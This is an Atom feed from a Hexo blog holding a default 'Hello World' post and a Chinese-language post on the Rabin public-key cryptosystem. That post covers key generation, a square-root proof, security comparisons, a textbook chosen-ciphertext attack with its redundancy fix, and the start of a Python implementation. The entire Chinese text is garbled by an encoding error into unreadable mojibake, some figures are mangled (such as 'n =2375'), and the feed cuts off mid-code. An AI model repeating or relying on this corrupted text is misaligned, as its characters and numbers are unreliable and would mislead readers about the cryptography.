<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Capcomin&#39;s blogs</title>
  
  
  <link href="https://zxy.link/atom.xml" rel="self"/>
  
  <link href="https://zxy.link/"/>
  <updated>2022-01-22T04:14:53.705Z</updated>
  <id>https://zxy.link/</id>
  
  <author>
    <name>Capcomin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="https://zxy.link/posts/4a17b156/"/>
    <id>https://zxy.link/posts/4a17b156/</id>
    <published>2022-01-19T11:36:00.000Z</published>
    <updated>2022-01-22T04:14:53.705Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>RabinåŠ å¯†ä½“åˆ¶åŸç†æ¦‚è¿°</title>
    <link href="https://zxy.link/posts/7b9d3851/"/>
    <id>https://zxy.link/posts/7b9d3851/</id>
    <published>2021-12-29T09:25:01.000Z</published>
    <updated>2022-01-22T12:41:29.288Z</updated>
    
    <content type="html"><![CDATA[<h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>Rabin å¯†ç ç³»ç»Ÿæ˜¯ç¬¬ä¸€ä¸ªéå¯¹ç§°å¯†ç ç³»ç»Ÿï¼Œç”±<a href="https://en.wikipedia.org/wiki/Michael_O._Rabin">Michael Oser Rabin</a>äº1979å¹´åœ¨è®ºæ–‡*<a href="http://publications.csail.mit.edu/lcs/pubs/pdf/MIT-LCS-TR-212.pdf">Digitalized Signatures and Public-Key Functions as Intractable as Factorization</a>*ä¸­å‘è¡¨ã€‚å¯ä»¥è¯æ˜ä»å¯†æ–‡ä¸­æ¢å¤æ˜æ–‡ä¸åˆ†è§£ä¸€æ ·å›°éš¾ï¼Œå®ƒçš„å®‰å…¨æ€§æ¥æºäºå¤§æ•´æ•°çš„å› å­åˆ†è§£ã€‚ä¼˜ç‚¹ï¼š</p><ol><li><p> Rabin å‡½æ•°çš„æ¯ä¸ªè¾“å‡ºéƒ½å¯ä»¥ç”±å››ä¸ªå¯èƒ½çš„è¾“å…¥ä¸­çš„ä»»ä½•ä¸€ä¸ªç”Ÿæˆ</p></li><li><p> å¦‚æœæ¯ä¸ªè¾“å‡ºéƒ½æ˜¯å¯†æ–‡ï¼Œåˆ™è§£å¯†æ—¶éœ€è¦é¢å¤–çš„å¤æ‚æ€§æ¥è¯†åˆ«å››ä¸ªå¯èƒ½çš„è¾“å…¥ä¸­çš„å“ªä¸€ä¸ªæ˜¯çœŸæ­£çš„æ˜æ–‡</p></li></ol><h3 id="å¯†é’¥ç”Ÿæˆç®—æ³•"><a href="#å¯†é’¥ç”Ÿæˆç®—æ³•" class="headerlink" title="å¯†é’¥ç”Ÿæˆç®—æ³•"></a>å¯†é’¥ç”Ÿæˆç®—æ³•</h3><p>Rabinå¯†ç ç³»ç»Ÿçš„å¯†é’¥ç”Ÿæˆå¦‚ä¸‹ï¼š</p><p>1. é€‰æ‹©ä¸¤ä¸ªä¸åŒçš„å¤§ç´ æ•° ğ‘ å’Œ ğ‘ ï¼Œå¹¶ä¸”æ»¡è¶³ ğ‘â‰¡3 mod 4å’Œ ğ‘â‰¡3 mod 4</p><p>2. è®¡ç®— ğ‘› = ğ‘Ã—ğ‘.</p><p>å°† ğ‘ å’Œ ğ‘ ä½œä¸ºç§é’¥ï¼Œ<em>n</em> ä½œä¸ºå…¬é’¥ã€‚</p><p>ä¸€ä¸ªæ¶ˆæ¯ <em>M</em> é¦–å…ˆè½¬æ¢ä¸ºæ•°å­— <em>m</em> (<em>m &lt; n,</em> å¯é€†æ˜ å°„)ï¼Œç„¶åè®¡ç®—. å¯†æ–‡ä¸º <em>c</em> .</p><p>æ¶ˆæ¯ <em>m</em> å¯ä»¥ä»å¯†æ–‡ä¸­ <em>c</em> é€šè¿‡å–å…¶å¹³æ–¹æ ¹æ¨¡ <em>n</em> å¦‚ä¸‹ã€‚<br>$$<br>\begin{equation}<br>\begin{aligned}<br>&amp;m_{p 1}=c^{\frac{1}{4}(p+1)} \bmod p, \ m_{p 2}=\left(p-m_{p 1}\right) \bmod p \\<br>&amp;m_{q 1}=c^{\frac{1}{4}(q+1)} \bmod q, \ m_{q 2}=\left(q-m_{q 1}\right) \bmod q<br>\end{aligned}<br>\end{equation}<br>$$<br>æ±‚å‡ºå››ä¸ª <em>m</em> åä¸¤ä¸¤ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†æ±‚è§£ï¼Œåˆ™å¾—åˆ°æ¶ˆæ¯ <em>m</em> çš„å››ä¸ªå¯è¡Œè§£ã€‚</p><p>è¿™å››ä¸ªå€¼ä¹‹ä¸€æ˜¯åŸå§‹æ˜æ–‡ <em>m</em>ï¼Œåœ¨æ²¡æœ‰é¢å¤–ä¿¡æ¯çš„æƒ…å†µä¸‹æ— æ³•ç¡®å®šè¿™å››ä¸ªä¸­çš„å“ªä¸€ä¸ªæ˜¯æ­£ç¡®çš„ã€‚å¦‚æœæ˜æ–‡æ„åœ¨ä»£è¡¨ä¸€æ¡çŸ­ä¿¡ï¼ŒçŒœæµ‹ä¸éš¾ï¼›ç„¶è€Œï¼Œå¦‚æœæ˜æ–‡æ—¨åœ¨è¡¨ç¤ºä¸€ä¸ªæ•°å€¼ï¼Œè¿™ä¸ªé—®é¢˜å°±æˆä¸ºä¸€ä¸ªå¿…é¡»é€šè¿‡æŸç§æ¶ˆæ­§æ–¹æ¡ˆæ¥è§£å†³çš„é—®é¢˜ã€‚å¯ä»¥é€‰æ‹©å…·æœ‰ç‰¹æ®Šç»“æ„çš„æ˜æ–‡ï¼Œæˆ–è€…æ·»åŠ <em>padding</em>ï¼ˆå¡«å……ï¼‰æ¥æ¶ˆé™¤è¿™ä¸ªé—®é¢˜ã€‚è¿™æ˜¯ Rabin å¯†ç ç³»ç»Ÿçš„ä¸»è¦ç¼ºç‚¹ã€‚</p><h3 id="æ¨¡-p-å¹³æ–¹æ ¹è¯æ˜"><a href="#æ¨¡-p-å¹³æ–¹æ ¹è¯æ˜" class="headerlink" title="æ¨¡ p å¹³æ–¹æ ¹è¯æ˜"></a>æ¨¡ <em>p</em> å¹³æ–¹æ ¹è¯æ˜</h3><p>å› ä¸º <em>p</em> æ˜¯å½¢å¦‚ç´ æ•°ï¼Œæ‰€ä»¥å­˜åœ¨å¥‡æ•° <em>s</em> ä½¿å¾—å³<br>$$<br>\begin{equation}<br>p-1=2s<br>\end{equation}<br>$$<br>ç°åœ¨åŒä½™å¼<br>$$<br>\begin{equation}<br>m^2\equiv c\ (mod\ p)<br>\end{equation}<br>$$<br>æœ‰è§£ï¼Œåˆ™æ ¹æ®æ¬§æ‹‰åˆ¤åˆ«æ¡ä»¶ï¼Œæœ‰<br>$$<br>\begin{equation}<br>c^\frac{p-1}{2}\equiv c^s\equiv1\ (mod\ p)<br>\end{equation}<br>$$</p><p>ä¸¤ç«¯åŒæ—¶ä¹˜ä»¥ <em>c</em> å¾—åˆ°<br>$$<br>\begin{equation}<br>c^{s+1}\equiv{(c^\frac{s+1}{2})}^2\equiv{(c^\frac{\frac{p-1}{2}+1}{2})}^2\equiv{(c^\frac{p+1}{4})}^2\equiv c\ (mod\ p)<br>\end{equation}<br>$$<br>å› æ­¤ï¼ŒåŒä½™å¼çš„è§£ä¸º<br>$$<br>\begin{equation}<br>m \equiv \pm c^{\frac{p+1}{4}}(mod\ p)<br>\end{equation}<br>$$</p><h2 id="RabinåŠ å¯†ä½“åˆ¶æ‹“å±•åˆ†æ"><a href="#RabinåŠ å¯†ä½“åˆ¶æ‹“å±•åˆ†æ" class="headerlink" title="RabinåŠ å¯†ä½“åˆ¶æ‹“å±•åˆ†æ"></a>RabinåŠ å¯†ä½“åˆ¶æ‹“å±•åˆ†æ</h2><h3 id="Rabinç®—æ³•å®‰å…¨æ€§èƒ½ä¸æ•ˆç‡åˆ†æ"><a href="#Rabinç®—æ³•å®‰å…¨æ€§èƒ½ä¸æ•ˆç‡åˆ†æ" class="headerlink" title="Rabinç®—æ³•å®‰å…¨æ€§èƒ½ä¸æ•ˆç‡åˆ†æ"></a>Rabinç®—æ³•å®‰å…¨æ€§èƒ½ä¸æ•ˆç‡åˆ†æ</h3><h4 id="ï¼ˆ1ï¼‰æ•ˆç‡é«˜"><a href="#ï¼ˆ1ï¼‰æ•ˆç‡é«˜" class="headerlink" title="ï¼ˆ1ï¼‰æ•ˆç‡é«˜"></a>ï¼ˆ1ï¼‰æ•ˆç‡é«˜</h4><p>RSAï¼ŒElGamalï¼Œçš„ä¸»è¦æ“ä½œæ˜¯æ¨¡å¹‚è¿ç®—ã€‚è¯¥æ“ä½œå…·æœ‰ç›¸å½“å¤§çš„æ—¶é—´å¤æ‚åº¦ï¼Œè¿™å¯¼è‡´åœ¨å®ç°éå¯¹ç§°åŠ å¯†ç®—æ³•æ—¶æ•ˆç‡é™ä½ã€‚åœ¨Rabinå¯†ç ç³»ç»Ÿä¸­ä½¿ç”¨æ¨¡å—å¹³æ–¹è¿ç®—æ¥ç”ŸæˆåŠ å¯†æ–‡æœ¬ï¼Œä¸å…¶ä»–éå¯¹ç§°å¯†ç ç®—æ³•ç›¸æ¯”ï¼Œè¿™å¤§å¤§åŠ å¿«äº†åŠ å¯†è¿‡ç¨‹ï¼Œè€Œä¸å½±å“å¯†ç ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚Rabin<br>é€‰æ‹©çš„åŠ å¯†æŒ‡æ•° <em>e</em> = 2 å¾ˆå°, å› æ­¤, åŠ å¯†é€Ÿåº¦ç›¸å¯¹è¾ƒå¿«, å¯åº”ç”¨äºè½¯ä»¶äº§å“ã€‚</p><h4 id="ï¼ˆ2ï¼‰å®‰å…¨æ€§å¼º"><a href="#ï¼ˆ2ï¼‰å®‰å…¨æ€§å¼º" class="headerlink" title="ï¼ˆ2ï¼‰å®‰å…¨æ€§å¼º"></a>ï¼ˆ2ï¼‰å®‰å…¨æ€§å¼º</h4><p>1ï¼‰æ±‚ <em>x</em>2 â‰¡ <em>y</em> (<em>mod n</em>) ç­‰ä»·äºæ±‚<em>n</em> çš„å› å­åˆ†è§£çš„å›°éš¾æ€§ï¼Œæ ¹æ®ç›®å‰å¤§æ•°åˆ†è§£çš„è¿›å±•æƒ…å†µ, åˆ†è§£ <em>n</em> =2375çš„å› æ•°ï¼Œå¤§è‡´è¦åœ¨äº¿æ¬¡æœºä¸Šä¸é—´æ–­çš„è¿è¡Œå…­åå¤šå¹´ã€‚</p><p>2ï¼‰Rabin è§£å¯†è¿‡ç¨‹åŸºäºæ±‚å¹³æ–¹æ ¹çš„é—®é¢˜ï¼ŒRabinå¯†ç ç³»ç»Ÿå¯¹é»‘å®¢æ”»å‡»çš„æŠµæŠ—ï¼Œè¿˜æ¶‰åŠåˆ°æ¨¡å¹‚è¿ç®—å’Œè§£ä¸­å›½å‰©ä½™å®šç†ï¼Œè¿™ä¸¤ç§ç¨‹åºéƒ½å…·æœ‰æ¬¡æŒ‡æ•°æ—¶é—´å¤æ‚åº¦ï¼Œå› æ­¤, è§£å¯†æ˜¯æ¯”è¾ƒå›°éš¾çš„ã€‚</p><h4 id="ï¼ˆ3ï¼‰ä¸RSAç›¸æ¯”è¾ƒ"><a href="#ï¼ˆ3ï¼‰ä¸RSAç›¸æ¯”è¾ƒ" class="headerlink" title="ï¼ˆ3ï¼‰ä¸RSAç›¸æ¯”è¾ƒ"></a>ï¼ˆ3ï¼‰ä¸RSAç›¸æ¯”è¾ƒ</h4><p>RSAå’ŒRabinçš„å¯†ç ç³»ç»Ÿéå¸¸ç›¸ä¼¼ã€‚ä¸¤è€…éƒ½æ˜¯åŸºäºå› å­åˆ†è§£çš„éš¾åº¦ã€‚ä¸»è¦åŒºåˆ«åœ¨äºï¼ŒRabinçš„å¯†ç ç³»ç»Ÿç­‰ä»·äºæ±‚æ•´æ•°å› å­åˆ†è§£ä¸€æ ·å›°éš¾ï¼Œè€Œè§£å†³RSAé—®é¢˜çš„æ–¹æ³•è¿˜æ²¡è¾¾åˆ°å› å­åˆ†è§£çš„éš¾åº¦ï¼Œè¿™ä½¿å¾—Rabinå¯†ç ç³»ç»Ÿæ›´åŠ è¿™æ ·æ¯”RSAæ›´å®‰å…¨ã€‚å¦ä¸€ä¸ªåŒºåˆ«æ˜¯æ”»å‡»çš„é£é™©ã€‚Rabinå¯†ç ç³»ç»Ÿå¯¹é€‰æ‹©æ˜æ–‡æ”»å‡»æ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯ç³»ç»Ÿå¯èƒ½ä¼šè¢«å¯†ç æ–‡æœ¬æ”»å‡»ç ´åä½¿æ”»å‡»è€…èƒ½å¤ŸçŸ¥é“ç§é’¥ã€‚RSAä¹Ÿæ˜¯æ˜“å—é€‰å®šå¯†æ–‡æ”»å‡»ï¼Œä½†ç§é’¥æ°¸è¿œéƒ½æ˜¯æœªçŸ¥çš„ã€‚</p><h4 id="ï¼ˆ4ï¼‰å¯¹äºè¢«åŠ¨æ”»å‡»æ˜¯å®‰å…¨çš„"><a href="#ï¼ˆ4ï¼‰å¯¹äºè¢«åŠ¨æ”»å‡»æ˜¯å®‰å…¨çš„" class="headerlink" title="ï¼ˆ4ï¼‰å¯¹äºè¢«åŠ¨æ”»å‡»æ˜¯å®‰å…¨çš„"></a>ï¼ˆ4ï¼‰å¯¹äºè¢«åŠ¨æ”»å‡»æ˜¯å®‰å…¨çš„</h4><p>ä½œä¸ºè¢«åŠ¨æ”»å‡»è€…çš„ä»»åŠ¡æ˜¯ä»å¯†æ–‡æ¶ˆæ¯<em>c</em>æ¢å¤å‡ºæ˜æ–‡æ¶ˆæ¯<em>m</em>ã€‚è¿™å°±æ˜¯å¹³æ–¹æ ¹SQROOTé—®é¢˜ã€‚åˆ†è§£<em>n</em>å’Œè®¡ç®—æ¨¡<em>n</em>çš„å¹³æ–¹æ ¹é—®é¢˜åœ¨è®¡ç®—ä¸Šæ˜¯ç­‰ä»·çš„ã€‚å› æ­¤ï¼Œå‡å®šåˆ†è§£<em>n</em>åœ¨è®¡ç®—ä¸Šä¸å¯èƒ½ï¼ŒRabinå…¬é’¥åŠ å¯†æ–¹æ¡ˆå°±å¯ä»¥è¯æ˜èƒ½å¤ŸæŠµæŠ—è¢«åŠ¨æ”»å‡»è€…çš„æ”»å‡»ã€‚</p><h3 id="ç ´è§£æ”»å‡»"><a href="#ç ´è§£æ”»å‡»" class="headerlink" title="ç ´è§£æ”»å‡»"></a>ç ´è§£æ”»å‡»</h3><h4 id="æœ‰å…³Rabinçš„å¯èƒ½æ”»å‡»"><a href="#æœ‰å…³Rabinçš„å¯èƒ½æ”»å‡»" class="headerlink" title="æœ‰å…³Rabinçš„å¯èƒ½æ”»å‡»"></a>æœ‰å…³Rabinçš„å¯èƒ½æ”»å‡»</h4><p>1ï¼‰åˆ©ç”¨æ•´æ•°çš„å› å­åˆ†è§£</p><p>é˜²èŒƒï¼šé€‰æ‹©<em>p</em>å’Œ<em>q</em>ä½¿å¾—åˆ†è§£<em>n</em>æ˜¯ä¸å¯è¡Œçš„ã€‚</p><p>2ï¼‰åˆ©ç”¨Rabinçš„ä¹˜æ€§è´¨</p><p>é˜²èŒƒï¼šå†—ä½™å‡½æ•°<em>R</em>æ˜¯éä¹˜æ€§çš„ã€‚</p><h4 id="å¯¹äºé€‰æ‹©å¯†æ–‡æ”»å‡»æ˜¯ä¸å®‰å…¨çš„"><a href="#å¯¹äºé€‰æ‹©å¯†æ–‡æ”»å‡»æ˜¯ä¸å®‰å…¨çš„" class="headerlink" title="å¯¹äºé€‰æ‹©å¯†æ–‡æ”»å‡»æ˜¯ä¸å®‰å…¨çš„"></a>å¯¹äºé€‰æ‹©å¯†æ–‡æ”»å‡»æ˜¯ä¸å®‰å…¨çš„</h4><p>å¯¹äºä¸»åŠ¨æ”»å‡»è€…ï¼ŒRabinå…¬é’¥åŠ å¯†å­˜åœ¨é€‰æ‹©å¯†æ–‡æ”»å‡»é—®é¢˜ã€‚è¿™æ ·çš„æ”»å‡»å¯ä»¥æŒ‰å¦‚ä¸‹æ­¥éª¤è¿›è¡Œã€‚æ”»å‡»è€…é€‰æ‹©ä¸€ä¸ªéšæœºæ•´æ•°<em>m</em>å¹¶è®¡ç®—<em>c â‰¡ m2 (mod n)<em>ã€‚æ”»å‡»è€…æäº¤ <em>c</em> ç»™ <em>A</em> çš„è§£å¯†æœºï¼Œå®ƒå°†è§£å¯†</em>c</em>å¹¶è¿”å›æŸä¸ªæ˜æ–‡æ¶ˆæ¯<em>y</em>ã€‚ç”±äº<em>A</em>ä¸çŸ¥é“æ˜æ–‡æ¶ˆæ¯<em>m</em>ï¼Œå¹¶ä¸”<em>m</em>ä¸ºéšæœºé€‰æ‹©ï¼Œæ˜æ–‡æ¶ˆæ¯yæœªå¿…å°±æ˜¯åŒä¸€ä¸ªæ¶ˆæ¯<em>m</em>ã€‚å¦‚æœéšæœºè¿”å›ï¼Œå°†æœ‰1/2å¯èƒ½æ€§ï¼Œ<em>y</em>ä¸ç­‰äºÂ±<em>m</em> (<em>mod n</em>)ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ(<em>m-yï¼Œn</em>)å°±æ˜¯<em>n</em>çš„ä¸€ä¸ªç´ æ•°å› å­ã€‚å¦åˆ™ï¼Œæ”»å‡»è€…å¯ä»¥æ¢æ–°çš„<em>m</em>é‡å¤ä»¥ä¸Šè¿‡ç¨‹ã€‚</p><h4 id="é’ˆå¯¹é€‰æ‹©å¯†æ–‡æ”»å‡»æ”¹è¿›"><a href="#é’ˆå¯¹é€‰æ‹©å¯†æ–‡æ”»å‡»æ”¹è¿›" class="headerlink" title="é’ˆå¯¹é€‰æ‹©å¯†æ–‡æ”»å‡»æ”¹è¿›"></a>é’ˆå¯¹é€‰æ‹©å¯†æ–‡æ”»å‡»æ”¹è¿›</h4><p>å†—ä½™è§„åˆ™ï¼šRabinå…¬é’¥åŠ å¯†æ–¹æ¡ˆçš„ä¸€ä¸ªç¼ºç‚¹æ˜¯æ¥æ”¶è€…éœ€è¦ä»4ç§å¯èƒ½æƒ…å†µä¸­é€‰æ‹©ä¸€ä¸ªæ­£ç¡®çš„è§£å¯†æ˜æ–‡æ¶ˆæ¯ã€‚è¿™ä¸€è§£å¯†ä¸­çš„ä¸ç¡®å®šé—®é¢˜åœ¨å®è·µä¸­å¯ä»¥é€šè¿‡é¢„å…ˆå¢åŠ å®šä¹‰åŸå§‹æ˜æ–‡æ¶ˆæ¯å†—ä½™æ¥è§£å†³ã€‚(ä¾‹å¦‚,æ˜æ–‡æ¶ˆæ¯çš„æœ€å64æ¯”ç‰¹éœ€è¦è¢«å¤åˆ¶ã€‚)è¿™æ ·,å°†æœ‰éå¸¸é«˜çš„æ¦‚ç‡è§£å¯†å‡ºæ¥çš„4ä¸ªå¯èƒ½æ˜æ–‡æ¶ˆæ¯ä¸­ä»…æœ‰ä¸€ä¸ªç¬¦åˆå†—ä½™çš„è§„åˆ™ã€‚å¦‚æœ4ä¸ªå¹³æ–¹æ ¹ä¸­æ²¡æœ‰ä¸€ä¸ªç¬¦åˆå†—ä½™è§„åˆ™,åˆ™æ¥æ”¶è€…å°±è®¤ä¸ºå‡ºé”™è€Œæ‹’ç»å¯†æ–‡æ¶ˆæ¯ã€‚</p><p>å¦‚æœå°†å†—ä½™è§„åˆ™ç”¨äºä»¥ä¸Šæƒ…å†µ,åˆ™Rabinå…¬é’¥åŠ å¯†æ–¹æ¡ˆå°†ä¸å†å­˜åœ¨é€‰æ‹©å¯†æ–‡æ”»å‡»é—®é¢˜ã€‚å¦‚æœæ”»å‡»è€…é€‰æ‹©ä¸€æ¡æ¶ˆæ¯<em>m</em>å¹¶å…·æœ‰è§„å®šçš„å†—ä½™å¹¶å°†<em>câ‰¡ m2(mod n)<em>æäº¤ç»™</em>A</em>çš„åŠ å¯†æœº,åŠ å¯†æœºå°†ä»¥éå¸¸é«˜çš„æ¦‚ç‡è¿”å›æ¶ˆæ¯<em>m</em>æœ¬èº«ç»™æ”»å‡»è€…(ç”±äºå…¶å®ƒ3ä¸ª<em>c</em>çš„æ¨¡å¹³æ–¹æ ¹æœ‰éå¸¸å¤§çš„æ¦‚ç‡ä¸åŒ…å«è§„å®šçš„å†—ä½™),åˆ™å°†ä¸ä¼šæä¾›ç»™æ”»å‡»è€…ä»»ä½•ä¿¡æ¯ã€‚å¦ä¸€æ–¹é¢,å¦‚æœæ”»å‡»è€…é€‰æ‹©ä¸åŒ…å«å†—ä½™çš„æ¶ˆæ¯<em>m</em>ï¼Œåˆ™æœ‰éå¸¸é«˜çš„å¯èƒ½æ€§4ä¸ªæ¨¡å¹³æ–¹æ ¹éƒ½ä¸å…·æœ‰éœ€è¦çš„å†—ä½™å½¢å¼ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹,è§£å¯†æœºå°†è®¤ä¸ºå¯¹<em>c</em>çš„è§£å¯†å¤±è´¥å¹¶å¯¹æ”»å‡»è€…ä¸åšç­”å¤ã€‚å› æ­¤ï¼ŒRabinå…¬é’¥åŠ å¯†é€šè¿‡å¯¹å¢åŠ é€‚å½“çš„å†—ä½™è§„åˆ™å°†æé«˜å…¶å®ç”¨ä»·å€¼ã€‚</p><h2 id="RabinåŠ å¯†ä½“åˆ¶ä»£ç ç¼–å†™ä¸ä¼˜åŒ–"><a href="#RabinåŠ å¯†ä½“åˆ¶ä»£ç ç¼–å†™ä¸ä¼˜åŒ–" class="headerlink" title="RabinåŠ å¯†ä½“åˆ¶ä»£ç ç¼–å†™ä¸ä¼˜åŒ–"></a>RabinåŠ å¯†ä½“åˆ¶ä»£ç ç¼–å†™ä¸ä¼˜åŒ–</h2><h3 id="Rabin-pç®—æ³•"><a href="#Rabin-pç®—æ³•" class="headerlink" title="Rabin-pç®—æ³•"></a>Rabin-<em>p</em>ç®—æ³•</h3><h4 id="Rabin-på…¬é’¥å¯†ç ä½“åˆ¶"><a href="#Rabin-på…¬é’¥å¯†ç ä½“åˆ¶" class="headerlink" title="Rabin-på…¬é’¥å¯†ç ä½“åˆ¶"></a>Rabin-<em>p</em>å…¬é’¥å¯†ç ä½“åˆ¶<img src="/img/fe1ee1e7ad8299a98f7c9f3350acad5a.png"></h4><p><img src="/img/4dc59f186daa1718ad77b2d7eccb7a04.png"><img src="/img/65111070d8135263c06085aa2e6c18ce.png"></p><h3 id="Rabin-pè¿è¡Œèµ„æºæ¶ˆè€—"><a href="#Rabin-pè¿è¡Œèµ„æºæ¶ˆè€—" class="headerlink" title="Rabin-pè¿è¡Œèµ„æºæ¶ˆè€—"></a>Rabin-<em>p</em>è¿è¡Œèµ„æºæ¶ˆè€—</h3><h4 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a><strong>Encryption</strong></h4><p><strong><img src="/img/5b62690f54713ae2de9da7c39dd43007.png"><img src="/img/53bd599d4c8782c1ece1bb846a7fc339.png"></strong></p><h4 id="Decryption"><a href="#Decryption" class="headerlink" title="Decryption"></a><strong>Decryption</strong></h4><p><img src="/img/22106af01cf061bd0064944a8c6765d9.bin"><img src="/img/7afd745cf5f33f13ead2ee9b2b88a7a8.png"></p><h3 id="Rabin-pè¿è¡Œæ—¶é—´æ¶ˆè€—"><a href="#Rabin-pè¿è¡Œæ—¶é—´æ¶ˆè€—" class="headerlink" title="Rabin-pè¿è¡Œæ—¶é—´æ¶ˆè€—"></a>Rabin-<em>p</em>è¿è¡Œæ—¶é—´æ¶ˆè€—</h3><h4 id="ä¸å…¶å®ƒç®—æ³•æ—¶é—´çš„å¯¹æ¯”"><a href="#ä¸å…¶å®ƒç®—æ³•æ—¶é—´çš„å¯¹æ¯”" class="headerlink" title="ä¸å…¶å®ƒç®—æ³•æ—¶é—´çš„å¯¹æ¯”"></a>ä¸å…¶å®ƒç®—æ³•æ—¶é—´çš„å¯¹æ¯”</h4><p><img src="/img/bf8ddd2b0051b1896388fa827dfbcf4a.png" alt="image-20220121200003948"></p><p><em>FIGURE 1. Encryption Running Time using k of 341, 682 and 1365-bit</em></p><p><img src="/img/28bf3b9f66358fb67bf6b16d5bcc9fca.png" alt="image-20220121200146795"></p><p><em>FIGURE 2. Decryption Running Time using k of 341, 682 and 1365-bit</em></p><p><strong>è¿è¡Œæ—¶é—´</strong></p><p><img src="/img/ad0a9492a594c86b2399954311581132.png"></p><h3 id="ä»£ç éƒ¨åˆ†"><a href="#ä»£ç éƒ¨åˆ†" class="headerlink" title="ä»£ç éƒ¨åˆ†"></a>ä»£ç éƒ¨åˆ†</h3><h4 id="RabinåŠ å¯†ä½“åˆ¶"><a href="#RabinåŠ å¯†ä½“åˆ¶" class="headerlink" title="RabinåŠ å¯†ä½“åˆ¶"></a>RabinåŠ å¯†ä½“åˆ¶</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#ç´ æ•°åˆ¤å®šå‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(math.sqrt(n)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span 